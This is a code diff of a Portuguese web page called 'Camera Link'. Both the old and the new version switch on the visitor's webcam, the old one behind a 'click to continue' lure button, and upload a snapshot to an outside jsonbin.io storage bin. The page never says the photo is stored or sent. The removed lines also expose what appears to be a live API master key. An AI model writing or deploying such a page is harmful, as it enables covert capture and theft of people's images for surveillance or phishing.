@@ -1,76 +1,68 @@
 <!DOCTYPE html>
-<html>
-<body style="background:#111; color:white; text-align:center; font-family:sans-serif;">
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Camera Link</title>
+</head>
+<body>
 
-<h2>Clique no botão para continuar</h2>
-<button id="startBtn">Clique aqui para continuar</button>
-
-<video id="video" width="320" height="240" autoplay style="display:none;"></video>
-<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-<p id="status"></p>
+<h2>Abrindo câmera...</h2>
+<video id="video" autoplay playsinline width="300"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-const startBtn = document.getElementById('startBtn');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const status = document.getElementById('status');
-
-const JSONBIN_KEY = "$2a$10$TGWviiTU6WDwbnoyxXdO1OB.zfLXw2aPhoG4SChWWQYA757BpZBqO";
 const BIN_ID = "69d65f7036566621a88f23ad";
+const API_KEY = "SUA_KEY_AQUI";
 
-startBtn.onclick = async () => {
-    startBtn.style.display = "none";
-    video.style.display = "block";
+async function startCamera() {
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+  document.getElementById("video").srcObject = stream;
 
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
+  setTimeout(captureAndSend, 3000);
+}
 
-        setTimeout(async () => {
-            canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-            const foto = canvas.toDataURL('image/png');
+async function captureAndSend() {
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const ctx = canvas.getContext("2d");
 
-            status.innerText = "Enviando...";
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
 
-            // pegar dados atuais
-            const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-                headers: { "X-Master-Key": JSONBIN_KEY }
-            });
+  ctx.drawImage(video, 0, 0);
 
-            const json = await res.json();
+  const image = canvas.toDataURL("image/png");
 
-            let lista = [];
+  await salvarImagem(image);
+}
 
-            if (json.record && Array.isArray(json.record)) {
-                lista = json.record;
-            } else if (json.record && Array.isArray(json.record.record)) {
-                lista = json.record.record;
-            }
-
-            lista.push(foto);
-
-            // salvar corretamente
-            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-                method: "PUT",
-                headers: {
-                    "Content-Type": "application/json",
-                    "X-Master-Key": JSONBIN_KEY
-                },
-                body: JSON.stringify({
-                    record: lista
-                })
-            });
-
-            status.innerText = "Foto enviada!";
-            video.style.display = "none";
-
-        }, 1000);
-
-    } catch (err) {
-        status.innerText = "Erro ao acessar câmera!";
-        console.error(err);
+async function salvarImagem(base64) {
+  let res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+    headers: {
+      "X-Master-Key": API_KEY
     }
-};
+  });
+
+  let data = await res.json();
+  let imagens = data.record || [];
+
+  imagens.push(base64);
+
+  await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+    method: "PUT",
+    headers: {
+      "Content-Type": "application/json",
+      "X-Master-Key": API_KEY
+    },
+    body: JSON.stringify({
+      record: imagens
+    })
+  });
+
+  console.log("Imagem enviada!");
+}
+
+startCamera();
 </script>
 
 </body>
